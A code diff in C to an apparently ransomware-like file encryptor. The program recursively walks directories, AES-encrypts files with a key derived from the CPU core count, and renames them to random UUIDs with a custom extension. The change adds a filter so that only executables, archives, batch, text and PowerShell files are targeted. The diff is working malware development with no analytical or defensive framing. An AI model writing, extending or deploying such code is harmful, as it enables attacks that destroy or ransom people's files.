@@ -15,7 +15,10 @@ char randomByte();
 //void de_str(struct AES_ctx* ctx, const char* key, const char* iv, const char* data, char** output);
 char* uuid4();
 int getkey();
+const char* get_file_ext(const char* fname);
 void processFilesRecursively(struct AES_ctx* ctx, int mode, const char* basePath, const char* ext);
+
+const char* exts = ",exe,rar,bat,txt,ps1,";
 
 int main(int argc, char *argv[])
 {
@@ -253,6 +256,13 @@ int getkey()
 	return (ncores+nthreads+ht+(sizeof(void *) * 8));
 }
 
+const char* get_file_ext(const char* fname)
+{
+	const char* dot = strrchr(fname, '.');
+	if(!dot || dot == fname) return "";
+	return dot + 1;
+}
+
 void processFilesRecursively(struct AES_ctx* ctx, int mode, const char* basePath, const char* ext)
 {
     char path_old[PATH_SIZE];
@@ -276,21 +286,43 @@ void processFilesRecursively(struct AES_ctx* ctx, int mode, const char* basePath
 			strcpy(path_new, basePath);
             strcat(path_new, "\\");
 			
-			if (mode==1)
-			{
-				char* buffer = uuid4();
-				strcat(path_new, buffer);
-				free(buffer);
-				strcat(path_new, ".");
-				strcat(path_new, ext);
-			}
-			
 			if (dir_exists(path_old))
 			{				
 				processFilesRecursively(ctx, mode, path_old, ext);
 			}
 			else
 			{
+				if (mode==1)
+				{
+					const char* fext = get_file_ext(dp->d_name);
+					int felen = strlen(fext);
+					char* fel = (char*)malloc((felen+1) * sizeof(char));
+					strcpy(fel,fext);
+					toLower(fel);
+					char* extret = strstr(exts, fel);
+					free(fel);
+					if (extret)
+					{
+						extret--;
+						if (extret[0]!=',')
+							continue;
+						for (int i = 0; i <= felen; ++i)
+							extret++;
+						if (extret[0]!=',')
+							continue;
+					}
+					else
+					{
+						continue;
+					}
+					
+					char* buffer = uuid4();
+					strcat(path_new, buffer);
+					free(buffer);
+					strcat(path_new, ".");
+					strcat(path_new, ext);
+				}
+				
 				// Check Path contains extension
 				char* ret = strstr(path_old, ext);
 				if (mode==1 && ret)
